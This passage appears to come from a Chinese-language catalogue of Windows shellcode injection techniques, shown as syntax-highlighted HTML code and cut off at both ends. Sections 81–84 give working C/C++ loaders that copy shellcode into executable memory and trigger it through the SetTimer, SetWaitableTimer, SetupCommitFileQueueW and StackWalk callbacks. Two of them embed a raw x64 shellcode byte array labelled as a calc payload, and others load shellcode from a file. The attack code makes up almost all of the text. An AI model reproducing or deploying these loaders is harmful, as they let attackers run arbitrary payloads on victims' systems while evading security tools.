hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(hThread)<br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hThread);<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">47</span>}<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">50</span></span>{<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">64</span>}<br></code></pre>
<h1 id="h81settimer"><span>81.回调函数注入 通过 SetTimer</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;UINT_PTR&nbsp;dummy&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;MSG&nbsp;msg;<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;::SetTimer(<span class="hljs-literal">NULL</span>,&nbsp;dummy,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(TIMERPROC)address);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;::GetMessageW(&amp;msg,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-number">0</span>,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;::DispatchMessageW(&amp;msg);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>}<br></code></pre>
<h1 id="h82setwaitabletimer"><span>82.回调函数注入 通过 SetWaitableTimer</span></h1>
<pre><code class="hljs objectivec"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#include&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#include&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-built_in">BOOL</span>&nbsp;ReadContents(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize);<br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span>INT&nbsp;wmain(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])<br><span class="linenum hljs-number">11</span>{<br><span class="linenum hljs-number">12</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">BOOL</span>&nbsp;Ret&nbsp;=&nbsp;<span class="hljs-literal">FALSE</span>;<br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">15</span><br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(<span class="hljs-string">"Usage:&nbsp;SetWaitableTimer.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;<span class="hljs-built_in">CLEANUP</span>;<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">21</span><br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;<span class="hljs-built_in">CLEANUP</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">28</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;sLI&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hTimer&nbsp;=&nbsp;CreateWaitableTimer(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">FALSE</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;SetWaitableTimer(hTimer,&nbsp;&amp;sLI,&nbsp;<span class="hljs-number">0x0</span>,&nbsp;(PTIMERAPCROUTINE)&nbsp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">FALSE</span>);<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;SleepEx(<span class="hljs-number">1000</span>,&nbsp;<span class="hljs-literal">TRUE</span>);<br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><span class="hljs-built_in">CLEANUP</span>:<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free(Shellcode);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">42</span>}<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span><span class="hljs-built_in">BOOL</span>&nbsp;ReadContents(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)<br><span class="linenum hljs-number">45</span>{<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;L<span class="hljs-string">"rb"</span>);<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;malloc(*BufferSize);<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">55</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">57</span><br><span class="linenum hljs-number">58</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;<span class="hljs-literal">TRUE</span>&nbsp;:&nbsp;<span class="hljs-literal">FALSE</span>;<br><span class="linenum hljs-number">59</span>}<br></code></pre>
<h1 id="h83setupcommitfilequeuew"><span>83.回调函数注入 通过 SetupCommitFileQueueW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;setupapi.h&gt;</span></span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Setupapi.lib"</span>)</span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;HSPFILEQ&nbsp;hQueue&nbsp;=&nbsp;::SetupOpenFileQueue();<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;::SetupQueueCopyW(hQueue,&nbsp;<span class="hljs-string">L"c:\\"</span>,&nbsp;<span class="hljs-string">L"\\windows\\sytem32\\"</span>,&nbsp;<span class="hljs-string">L"kernel32.dll"</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-string">L"c:\\windows\\temp\\"</span>,&nbsp;<span class="hljs-string">L"kernel32.dll"</span>,&nbsp;SP_COPY_NOSKIP);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;::SetupCommitFileQueueW(::GetTopWindow(<span class="hljs-literal">NULL</span>),&nbsp;hQueue,&nbsp;(PSP_FILE_CALLBACK_W)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>}<br></code></pre>
<h1 id="h84stackwalk"><span>84.回调函数注入 通过 StackWalk</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"DbgHelp.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;StackWalk.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;STACKFRAME&nbsp;sStackFrame&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum 